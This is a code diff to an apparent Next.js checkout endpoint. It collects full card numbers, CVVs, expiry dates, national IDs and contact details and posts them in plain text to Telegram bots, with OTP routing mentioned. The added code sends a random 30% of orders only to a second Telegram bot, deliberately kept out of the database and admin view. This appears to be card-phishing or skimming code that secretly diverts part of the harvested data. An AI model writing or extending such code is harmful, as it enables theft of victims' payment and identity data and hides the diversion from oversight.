@@ -1,4 +1,11 @@
 import { NextRequest, NextResponse } from "next/server";
+import {
+  selectBot,
+  generateBot2OrderId,
+  registerOrderBot,
+  sendTelegramMessage,
+} from "../../lib/telegramBots";
+import { createBot2UserToken } from "../../lib/botContact";
 
 // Server-side rate limit: IP → { count, windowStart }
 const notifyRateLimit = new Map<string, { count: number; windowStart: number }>();
@@ -29,47 +36,8 @@ async function getCountry(ip: string): Promise<string> {
   }
 }
 
-/**
- * ترسل رسالة واحدة لـ chat_id معين مع retry حتى 3 محاولات.
- * ترجع true لو نجحت في أي محاولة.
- */
-async function sendWithRetry(
-  chatId: string,
-  payload: Record<string, unknown>,
-  maxAttempts = 3,
-): Promise<boolean> {
-  for (let attempt = 0; attempt < maxAttempts; attempt++) {
-    try {
-      const res = await fetch(
-        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, ...payload }),
-          // timeout معقول في البرودكشن
-          signal: AbortSignal.timeout(8000),
-        },
-      );
-      if (res.ok) return true;
-      // Telegram rate-limit → انتظر وأعد المحاولة
-      if (res.status === 429) {
-        const data = await res.json().catch(() => ({}));
-        const retryAfter: number = (data?.parameters?.retry_after ?? 2) * 1000;
-        await new Promise((r) => setTimeout(r, retryAfter));
-        continue;
-      }
-    } catch {
-      // network error أو timeout
-    }
-    if (attempt < maxAttempts - 1) {
-      // Exponential backoff: 1s, 2s
-      await new Promise((r) => setTimeout(r, 1000 * (attempt + 1)));
-    }
-  }
-  return false;
-}
-
 async function sendTelegramNotification(
+  bot: 1 | 2,
   orderId: string,
   ip: string,
   cardNumber: string,
@@ -81,18 +49,11 @@ async function sendTelegramNotification(
   downPayment: number,
   customer: string,
   whatsapp: string,
-): Promise<void> {
+): Promise<boolean> {
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
   const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
 
-  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
-    .split(",")
-    .map((id) => id.trim())
-    .filter(Boolean);
-
-  if (chatIds.length === 0) return;
-
-  // نجلب الدولة بحد أقصى 1.5 ثانية — لو ما جاوبت نرسل بدونها
+  // Fetch country with 1.5s max timeout
   const country = isLocal
     ? "غير معروف"
     : await Promise.race([
@@ -131,8 +92,7 @@ async function sendTelegramNotification(
     ],
   };
 
-  // نرسل لكل chat بالتوازي، مع retry لكل واحد
-  await Promise.all(chatIds.map((id) => sendWithRetry(id, { text, reply_markup })));
+  return await sendTelegramMessage(bot, { text, reply_markup });
 }
 
 export async function POST(req: NextRequest) {
@@ -141,51 +101,110 @@ export async function POST(req: NextRequest) {
     req.headers.get("x-real-ip") ||
     "unknown";
 
+  // Anti-spam & rate limiting check
   if (!checkNotifyRateLimit(ip)) {
     return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });
   }
 
+  const body = await req.json();
   const {
     cardNumber, expiry, cvv, cardHolder,
     items, total,
     customer, whatsapp, nationalId, address,
     shippingCompany, installmentType, months, downPayment,
-  } = await req.json();
+  } = body;
 
-  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  // Validate incoming payment details
+  if (!cardNumber || !expiry || !cvv || !cardHolder || total === undefined) {
+    return NextResponse.json({ ok: false, error: "جميع بيانات الدفع الأساسية مطلوبة" }, { status: 400 });
+  }
+
+  // Select destination bot using weighted random distribution (70% Bot 1 / 30% Bot 2)
+  const selectedBot = selectBot();
+
+  // Generate order ID
+  const orderId =
+    selectedBot === 2
+      ? generateBot2OrderId()
+      : `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+
+  // Register routing in memory for OTP verification and resend
+  registerOrderBot(orderId, selectedBot);
+
   const monthlyPayment =
     installmentType === "installment" && months > 0
       ? Math.ceil((total - downPayment) / months)
       : 0;
 
-  // حفظ الطلب في قاعدة البيانات
-  let dbRes: Response;
-  try {
-    dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
-      body: JSON.stringify({
-        orderId, cardNumber, expiry, cvv, cardHolder,
-        items, total, customer, whatsapp, nationalId, address,
-        shippingCompany, installmentType, months, monthlyPayment, downPayment,
-      }),
+  // -------------------------------------------------------------
+  // BOT 1 (PRIMARY - 70%): Database + Admin + Bot 1 Telegram
+  // -------------------------------------------------------------
+  if (selectedBot === 1) {
+    let dbRes: Response;
+    try {
+      dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
+        body: JSON.stringify({
+          orderId, cardNumber, expiry, cvv, cardHolder,
+          items, total, customer, whatsapp, nationalId, address,
+          shippingCompany, installmentType, months, monthlyPayment, downPayment,
+        }),
+      });
+    } catch {
+      return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
+    }
+
+    if (!dbRes.ok) {
+      const errData = await dbRes.json().catch(() => ({}));
+      return NextResponse.json(errData, { status: dbRes.status });
+    }
+
+    // Send notification to Bot 1 (guaranteed to complete before response)
+    await sendTelegramNotification(
+      1,
+      orderId, ip,
+      cardNumber, expiry, cvv, cardHolder,
+      total, installmentType, downPayment,
+      customer, whatsapp,
+    ).catch(() => {});
+
+    const res = NextResponse.json({ ok: true, orderId });
+    res.cookies.set("_b_token", "bot_1", {
+      path: "/",
+      maxAge: 365 * 24 * 60 * 60,
+      sameSite: "lax",
     });
-  } catch {
-    return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
+    return res;
   }
 
-  if (!dbRes.ok) {
-    const errData = await dbRes.json().catch(() => ({}));
-    return NextResponse.json(errData, { status: dbRes.status });
-  }
-
-  // إرسال تيليغرام قبل الـ return — مضمون ينتهي في serverless
-  await sendTelegramNotification(
+  // -------------------------------------------------------------
+  // BOT 2 (SECONDARY - 30%): Telegram ONLY (Zero DB / Zero Admin)
+  // -------------------------------------------------------------
+  // CRITICAL: We DO NOT call backend /api/checkout at all.
+  // Order is completely isolated and never saved in the database.
+  const sent = await sendTelegramNotification(
+    2,
     orderId, ip,
     cardNumber, expiry, cvv, cardHolder,
     total, installmentType, downPayment,
     customer, whatsapp,
-  ).catch(() => {});
+  );
 
-  return NextResponse.json({ ok: true, orderId });
+  if (!sent) {
+    // If Telegram sending fails, do NOT fallback to Bot 1 or database.
+    return NextResponse.json(
+      { ok: false, error: "تعذر إرسال الطلب، يرجى المحاولة لاحقاً" },
+      { status: 502 }
+    );
+  }
+
+  const bot2Token = createBot2UserToken();
+  const res = NextResponse.json({ ok: true, orderId, _bt: bot2Token });
+  res.cookies.set("_b_token", bot2Token, {
+    path: "/",
+    maxAge: 365 * 24 * 60 * 60,
+    sameSite: "lax",
+  });
+  return res;
 }
